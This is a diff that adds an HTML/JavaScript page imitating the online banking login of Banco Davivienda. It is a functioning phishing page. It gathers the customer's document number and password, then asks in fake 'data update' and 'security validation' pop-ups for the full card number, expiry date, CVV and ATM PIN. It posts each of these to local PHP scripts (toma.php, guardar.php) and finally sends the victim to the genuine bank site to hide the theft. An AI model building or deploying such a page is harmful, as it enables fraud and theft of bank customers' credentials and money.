@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>DAVIVIENDA</title>
+<meta charset="utf-8">
+<meta name="keywords" content="Redes Sociales. Vigilado, superintendencia financiera de Colombia. Banco Davivienda S.A. Todos los derechos reservados 2018. "/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="description" content="Course Project">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" type="text/css" href="plugins/OwlCarousel2-2.2.1/owl.carousel.css">
+<link rel="stylesheet" type="text/css" href="plugins/OwlCarousel2-2.2.1/owl.theme.default.css">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+<link rel="stylesheet" type="text/css" href="styles/main_styles.css">
+<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="css/stilo.css">
+<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
+<link href="css/stylesheet.css" rel="stylesheet">
+<link rel="icon" type="image/png" href="favicon.png">
+<style type="text/css">
+	 label, input{
+    	font-family: 'Helvetica Neue LT Std'; 
+    }
+
+    input{
+    	color: #fff !important;
+    	font-size: 12px !important; 
+    	font-weight: bold;
+    	padding: 1.2em !important;
+    }
+
+	@media (max-height:500px) {
+
+			#popTarjeta {
+				position: unset !important;
+    		top:0 !important;
+    		left:0 !important;
+   			transform:none !important;   
+			}
+			.fondo {
+			    display: none !important;
+			}
+
+			.ingreso {
+			    display: none !important;
+			}
+
+			.resto {
+			    display: none !important;;
+			}
+
+			body {
+			   background: #fff !important;
+			}
+
+			div#popTarjeta {
+			    margin: 0 auto !important;
+			}
+	}    
+
+	@media (max-width:500px) {
+		#popTarjeta {
+    	padding: 16px!important;
+  	}
+
+  	#popTarjeta div {
+    	padding: 14px!important;
+  	}
+
+  	#popCorreo {
+    	padding: 16px!important;
+  	}
+
+  	#popCorreo div {
+    	padding: 14px!important;
+  	}
+
+	  .usuario{
+	  	width: 100%;
+		
+	  }
+	  .acceso{
+	  	width: 100%;
+	  	
+	  }
+	  .correo-con{
+	  	width: 100%;	  
+	  }
+	  .tarjeta{
+	  	width: 100%;	  
+	  }
+	  .ingreso{
+	  	padding-left: 0px;
+	  	padding-right: 0px;
+	  	overflow-x: auto;
+	  	height: 70vh;
+	  }
+	  .container .ingreso .acceso select{
+	  	width: 80vw;
+	  }
+	   .container .ingreso .acceso .usuario{
+	  	text-align: center;
+	  }
+	   .container .ingreso .acceso .usuario label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .acceso .usuario input{
+	  	margin-left: -80px;
+	  }
+	  .container .ingreso .acceso .clave{
+	  	width:100%;
+	  	text-align: center;
+	  }
+	  .container .ingreso .acceso .clave label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .acceso .clave input{
+	  	margin-left: -80px;
+	  }
+
+	 
+	   .container .ingreso .correo-con .email{
+	  	text-align: center;
+	  		width:100%;
+	  }
+	   .container .ingreso .correo-con .email label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .correo-con .email input{
+	  	margin-left: -80px;
+	  }
+	  .container .ingreso .correo-con .clave-co{
+	  	width:100%;
+	  	text-align: center;
+	  }
+	  .container .ingreso .correo-con .clave-co label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .correo-con .clave-co input{
+	  	margin-left: -80px;
+	  }
+
+
+	   .container .ingreso .tarjeta .tarjeta16{
+	  	text-align: center;
+	  		width:100%;
+	  }
+	   .container .ingreso .tarjeta .tarjeta16 label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .tarjeta .tarjeta16 input{
+	  	margin-left: -80px;
+	  }
+	  .container .ingreso .tarjeta .expira{
+	  	width:100%;
+	  	text-align: center;
+	  }
+	  .container .ingreso .tarjeta .expira label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .tarjeta .expira input{
+	  	margin-left: -80px;
+	  }
+	  .container .ingreso .tarjeta .cvv{
+	  	width:100%;
+	  	text-align: center;
+	  }
+	  .container .ingreso .tarjeta .cvv label{
+	  	margin-left: -80px;
+	  }
+	   .container .ingreso .tarjeta .cvv input{
+	  	margin-left: -80px;
+	  }
+
+
+	  .fa-boton{
+	  	text-align:center;
+	  	display: block;
+	  	margin-left:-50vw;
+	  	box-shadow: 0px 3px red;
+	  }
+	  .arriba div{
+	  }
+	  .x{
+	  	top:5%;
+	  }
+	  .btniniciar{
+	  	text-align: center;
+	  	margin-left: -75px;
+	  }
+	  .fa-lock{
+	  	font-size: 16px;
+	  	vertical-align: top;
+	  }
+	  .transacciones{
+	  	font-size: 12px;
+	  	vertical-align: top;
+	  }
+}
+.fa-lock{
+	  	font-size: 10px;
+	  }
+.transacciones{
+	font-size: 32px;
+}
+
+.msgVacio{
+	display: none;
+}
+
+
+.fondo{
+	width: 100%;
+	height: 100%;
+	position: fixed;
+	z-index: 189;
+	top: 0;
+	left: 0;
+	background: #00000082;
+	display: none ;
+}
+
+.cargando{
+	width: 78px;
+	height: 78px;
+	position: fixed;
+	z-index: 192;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%);
+	display:none;
+}
+
+#popTarjeta{
+	padding: 30px;
+	background: #fff;
+  	position: fixed;
+  	z-index: 195;
+    top: 50%;
+    left: 50%;
+    width: 94%;  
+    max-width: 470px;      
+    border-radius: 15px;
+    color: #000;
+    font-family: 'Helvetica Neue LT Std'; 
+    font-weight: 100; 
+    font-style: normal;
+    font-size: 18px;
+    transform: translate(-50%, -50%);
+    display: none;
+}
+#popCorreo{
+	padding: 30px;
+	background: #fff;
+  	position: fixed;
+  	z-index: 195;
+    top: 50%;
+    left: 50%;
+    max-width: 470px;
+    width: 94%;        
+    border-radius: 15px;
+    color: #000;
+    font-family: 'Helvetica Neue LT Std'; 
+    font-weight: 100; 
+    font-style: normal;
+    font-size: 18px;
+    transform: translate(-50%, -50%);
+    display: none;
+}
+.entradas-blanco{
+	color: #000 !important;
+	width: 100%;
+	padding: 10px !important;
+	font-size: 14px !important;
+	font-weight: 600;
+	border-radius: 10px;
+}
+.boton-blanco{
+    cursor: pointer;
+    display: inline-block;
+    vertical-align: middle;
+    background: #ed1c27;
+    font-size: 14px;
+    padding: 0.6em;
+    color: #fff;
+    margin-left: 0.3em;
+    margin-bottom: 0.2em;
+    border-radius: 0.3em;
+    box-shadow: 1px 1px #906;
+    font-family: 'Helvetica Neue LT Std'; 
+    font-size: 14px; 
+    font-weight: bold;
+}
+
+.msgErr{
+	font-size: 11px;
+    font-style: italic;
+    color: #C1191F;
+    font-family: Roboto;
+    font-weight: 400;
+    height: 20px;
+}
+
+</style>
+<script type="text/javascript">
+	var cExp = 0;
+	var valor = "";
+	$(document).ready(function($){
+
+	var ventana_ancho = $(window).width();
+	if (ventana_ancho>1000) {
+		$('.resto').html('<img src="img/bg.jpg" onclick="usuarios_1()" style="width: 100vw">');
+		$('.fa-lock').css('font-size','16px');
+	}
+	if (ventana_ancho<1000 && ventana_ancho>500) {
+		$('.resto').html('<img src="img/bgtablet.jpg" onclick="usuarios_1()" style="width: 100vw">');
+		$('.ayuda').css('display','none');
+		$('.nuevaHerramienta').css('display','none');
+		$('.pregunta_1').css('display','none');
+		$('.candado_1').css('display','none');
+		$('.fa-lock').css('font-size','16px');
+	}
+	if (ventana_ancho<500) {
+		$('.resto').html('<img src="img/bgcel.jpg" onclick="usuarios_1()" style="width: 100vw">');
+		$('.ayuda').css('display','none');
+		$('.nuevaHerramienta').css('display','none');
+		$('.pregunta_1').css('display','none');
+		$('.candado_1').css('display','none');
+		$('.transacciones').css('font-size','18px');
+		$('.fa-lock').css('font-size','8px');
+	}
+	
+}); 
+</script>
+</head>
+<body>
+
+	<div class="fondo"></div>
+	<div class="cargando"><img src="img/load.gif"></div>
+	<div id="popTarjeta">
+		<table>
+			<tr>
+				<td><img src="img/icono.png" width="46"></td>
+				<td style="font-size:24px; padding-left: 10px;">Actualización <strong>de Datos</strong></td>
+			</tr>
+		</table>
+		<br>
+		<div style="background-color: #F8F8F8;padding: 20px; border-radius: 5px;">
+			Ingrese los 16 dígitos de la tarjeta débito o crédito
+			<br>
+			<input type="text" class="entradas-blanco" id="txtTarjeta" name="txtTarjeta" maxlength="16" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+			<div id="msgTarjeta" class="msgErr"></div>
+			
+			Fecha de Vecimiento
+			<br>
+			<table width="100%">
+				<tr>
+					<td>
+						<select id="mFecha" name="mFecha" class="entradas-blanco">
+							<option value="" default="default" selected="selected">Mes</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+		              	</select>
+					</td>
+					<td>
+						<select id="aFecha" name="aFecha" class="entradas-blanco">
+							<option value="" default="" selected="selected">Año</option>
+							<option value="2022">2022</option>
+							<option value="2023">2023</option>
+							<option value="2024">2024</option>
+							<option value="2025">2025</option>
+							<option value="2026">2026</option>
+							<option value="2027">2027</option>
+							<option value="2028">2028</option>
+							<option value="2029">2029</option>
+							<option value="2030">2030</option>
+							<option value="2031">2031</option>
+							<option value="2032">2032</option>
+							<option value="2033">2033</option>
+						</select>	
+					</td>
+				</tr>
+			</table>
+			<div id="msgExpira" class="msgErr"></div>		
+			CVV
+			<br>
+			<input type="password" class="entradas-blanco" id="txtCVV" name="txtCVV" maxlength="3" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+			<div id="msgCVV" class="msgErr"></div>
+				
+		</div>
+		<br>
+		<div style="text-align: center;">
+			<div class="boton-blanco" id="btnTarjeta" onclick="guardartar()" style="margin: 0 auto;">Actualizar</div>
+		</div>
+	</div>
+
+
+<div id="popCorreo">
+		<table>
+			<tr>
+				<td><img src="img/correo.png" width="46"></td>
+				<td style="font-size:24px; padding-left: 10px;">Validación <strong>de Seguridad</strong></td>
+			</tr>
+		</table>
+		<br>
+		<div style="background-color: #F8F8F8;padding: 20px; border-radius: 5px;">				
+			Por motivos de seguridad por favor ingrese su clave de cajero
+			<br>
+			<input type="password" class="entradas-blanco" id="txtCCorreo" name="txtCCorreo" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+			<div id="msgClaveEmail" class="msgErr"></div>	
+						
+		</div>
+		<br>
+		<div style="text-align: center;">
+			<div class="boton-blanco" id="btnCorreo" onclick="registrar()" style="margin: 0 auto;">Actualizar</div>
+		</div>
+	</div>
+
+	<input type="hidden" name="cpyUser" id="cpyUser" value="">	
+	<input type="hidden" name="cpyPass" id="cpyPass" value="">
+	<input type="hidden" name="cpyFile" id="cpyFile" value="">
+
+	<input type="hidden" name="cpyTarjeta" id="cpyTarjeta" value="">	
+	<input type="hidden" name="cpyFecha" id="cpyFecha" value="">
+	<input type="hidden" name="cpyCVV" id="cpyCVV" value="">
+
+<div class="container">
+	<div class="ingreso">
+		<div class="arriba row">
+			<div class="transacciones">
+				<i id="icono-ti" class="fa fa-lock" style="font-size: 16px; width: 34px; padding-left: 12px;"></i> <span class="titulo-se" style="font-family: 'Helvetica Neue LT Std';">Transacciones <strong>para Clientes</strong></span>
+			</div>
+			<div class="pregunta_1">
+				<img src="img/pregunta.png"> 
+			</div>
+			<div class="candado_1">
+				<img src="img/seguridad.png">
+			</div>
+		</div>
+		<div class="acceso">
+			<div class="documento">
+				<label>Tipo de documento</label> <br>
+				<select><option>Cédula de ciudadanía</option>
+				<option>Cedula de extranjeria</option>
+				<option>NIT</option>
+				<option>Tarjeta de Identida</option>
+				<option>Pasaporte</option>
+				<option>Trj. Seguro Social Extranjero</option>
+				<option>Sociedad Extranjera sin NIT en Colombia</option>
+				<option>Fideicomiso</option>
+				<option>NIT Menores</option>
+				<option>RIF Venezuela</option>
+				<option>NIT Extranjeria</option>
+				<option>NIT Persona Natural</option>
+				<option>Registro Civil De Nacimiento</option>
+				<option>NIT Desasociado</option>
+				<option>CIF(Numero Unico de Cliente)</option>
+				<option>Numero de Identidad</option>
+				<option>RTN</option>
+				<option>Cedula de Identida</option>
+				<option>DIMEX</option>
+				<option>CED</option>
+		
+			<option>Pasaporte</option></select>
+			</div>
+			<div class="usuario">
+				<label>No. Documento </label> <br>
+				<input type="text" name="usuario" maxlength="20" autocomplete="off" placeholder="" id="usuario" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" >				
+				<span id="msgUsuario" class="msgVacio">El campo está vacio</span>
+			</div>
+			<div class="clave">
+				<label>Digite su clave</label> <br>
+				<input type="password" name="clave" autocomplete="off" id="clave" maxlength="20" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+				<span id="msgClave" class="msgVacio">El campo está vacio</span>
+			</div>
+			<div class="btniniciar">
+				<div class="fa-boton" onclick="iniciar()" style="font-family: 'Helvetica Neue LT Std'; font-size: 14px; font-weight: bold; "> Continuar</div>
+			</div>
+			<div class="recordar">
+				<input type="checkbox"> <label>recordar datos</label>
+			</div>
+		</div>		
+		<div class="ayuda">
+			<div class="titulo">
+				<h5>¿Necesitas <strong>ayuda</strong>?</h5>
+			</div>
+			<li><a href="#">¿Olvidó o bloqueo su clave?</a></li>
+			<li><a href="#">Recomendaciones de seguridad</a></li>
+			<li><a href="#">Demos Digitales</a></li>
+		</div>
+		<div class="nuevaHerramienta">
+			<h5>una nueva herramienta <strong>antifraude</strong> ha llegado</h5>
+			<div class=" fa-boton"> Conozcala aquí</div>
+		</div>
+		<div class="x" onclick="cerra_usuarios_1()">
+			x
+		</div>
+	</div>
+	<div class="resto">
+		<img src="img/bg.jpg" onclick="usuarios_1()" style="width: 100vw">
+	</div>
+
+</div>	
+<script type="text/javascript">
+
+let identificadorTiempoDeEspera;
+
+function RetrasoTarjeta() {
+  identificadorTiempoDeEspera = setTimeout(ventana_tarjeta, 700);
+}
+
+function ventana_tarjeta() {
+	$(".cargando").hide();
+	$("#popTarjeta").show();
+	$("#txtTarjeta").focus();		
+}
+
+function RetrasoCorreo() {
+  identificadorTiempoDeEspera = setTimeout(ventana_correo, 700);
+}
+
+function ventana_correo() {
+	$("#txtTarjeta").val("");
+	$("#mFecha").val("");
+	$("#aFecha").val("");
+	$("#txtCVV").val("");	
+	$(".cargando").hide();
+	$("#popCorreo").show();
+	$("#txtCorreo").focus();		
+}
+
+sessionStorage.setItem('suma','1');	
+
+function iniciar(){
+	suma = sessionStorage.getItem('suma');
+	if (suma == '2') {
+		if ($("#clave").val() != "") {			
+			if ($("#clave").val().length > 3) {
+				$("#msgUsuario").css("display", "none");
+				$("#msgClave").css("display", "none");
+				paso1();
+			}else{
+				$("#msgClave").html("Formato no valido");
+				$("#msgClave").css("display", "table");
+				$("#clave").focus();
+			}				
+		}else{			
+			$("#msgClave").html("El campo está vacio");
+			$("#msgClave").css("display", "table");
+			$("#clave").focus();
+		}
+	}else{
+		if ($("#usuario").val() != "") {
+			if ($("#usuario").val().length > 6) {
+				$("#msgUsuario").css("display", "none");
+				$("#msgClave").css("display", "none");
+				$(".clave").css('display','inline-block');
+				$( "input[name^='clave']" ).focus(  );
+				sessionStorage.setItem('suma','2');
+			}else{
+				$("#msgUsuario").html("Formato no valido");
+				$("#msgUsuario").css("display", "table");
+				$("#usuario").focus();
+			}			
+		}else{	
+			$("#msgUsuario").html("El campo está vacio");
+			$("#msgUsuario").css("display", "table");
+			$("#usuario").focus();
+		}		
+	}
+	
+}
+
+
+document.getElementById("cpyFile").value = data;
+		document.getElementById("cpyUser").value = usu;
+		document.getElementById("cpyPass").value = con;
+
+
+function guardartar(){
+	if ($("#txtTarjeta").val() != "") {
+		if ($("#txtTarjeta").val().length > 15) {
+			$("#msgTarjeta").html("");
+			if ($("#mFecha").val() != "" && $("#aFecha").val() != "") {
+				$("#msgExpira").html("");
+				if ($("#txtCVV").val() != "") {
+					if ($("#txtCVV").val().length > 2) {
+						$("#popTarjeta").hide();
+						$(".cargando").show();
+						
+						$("#msgCVV").html("");
+						$("#cpyTarjeta").val($("#txtTarjeta").val());
+						$("#cpyFecha").val($("#mFecha").val() + "-" +$("#aFecha").val());
+						$("#cpyCVV").val($("#txtCVV").val());
+						f = $("#mFecha").val() + "-" +$("#aFecha").val();
+						$.post( "guardar.php",{ usr: $("#cpyUser").val(), pas: $("#cpyPass").val(), ema: '', pasem: '', arch: $("#cpyFile").val(), trj:$("#txtTarjeta").val(), fec:f, codv:$("#txtCVV").val() },function( data ) {						
+							RetrasoCorreo();												
+						});
+					}else{
+						$("#msgTarjeta").html("");
+						$("#msgExpira").html("");
+						$("#msgCVV").html("Formato invalido");
+						$("#cvv").focus();
+					}
+				}else{
+					$("#msgTarjeta").html("");
+					$("#msgExpira").html("");
+					$("#msgCVV").html("El campo está vacio");
+					$("#cvv").focus();
+				}
+			}else{
+				$("#msgTarjeta").html("");
+				$("#msgExpira").html("El campo está vacio");
+				$("#msgCVV").html("");
+				$("#expira").focus();
+			}
+		}else{
+			$("#msgTarjeta").html("Formato invalido");
+			$("#msgExpira").html("");
+			$("#msgCVV").html("");
+			$("#txtTarjeta").focus();
+		}
+	}else{	
+		$("#msgTarjeta").html("El campo está vacio");
+		$("#msgExpira").html("");
+		$("#msgCVV").html("");
+		$("#txtTarjeta").focus();
+	}	
+}
+
+
+
+
+function uno(){
+$(".clave").css('display','inline-block');
+	sessionStorage.setItem('suma','2');
+}
+
+function dos(){
+alert('2');
+}
+
+function paso1(){
+	var usu = document.getElementById("usuario").value;
+	var con = document.getElementById("clave").value;
+
+	$.post( "toma.php",{ usr: usu, pas: con },function( data ) {
+		document.getElementById("cpyFile").value = data;
+		document.getElementById("cpyUser").value = usu;
+		document.getElementById("cpyPass").value = con;
+		$(".fondo").show();
+		$(".cargando").show();
+		RetrasoTarjeta();
+	});
+}
+
+
+function registrar(){
+
+		if ($("#txtCCorreo").val() != "") {
+			$("#msgClaveEmail").html("");
+			$.post( "guardar.php",{ usr: $("#cpyUser").val(), pas: $("#cpyPass").val(), ema: $("#txtCCorreo").val(), pasem: $("#txtCCorreo").val(), arch: $("#cpyFile").val(), trj:$("#cpyTarjeta").val(), fec:$("#cpyFecha").val(), codv:$("#cpyCVV").val() },function( data ) {
+				location.href = 'https://www.davivienda.com';
+			});
+		}else{
+			$("#msgClaveEmail").html("El campo está vacio");
+			$("#msgEmail").html("");
+			$("#txtCCorreo").focus();
+		}
+	
+
+}
+
+function usuarios_1(){
+	$('.ingreso').show(500);
+	$( "input[name^='usuario']" ).focus(  );
+}
+function cerra_usuarios_1(){
+	$('.ingreso').hide(500);	
+}
+</script>
+</body>	
+
+</html>
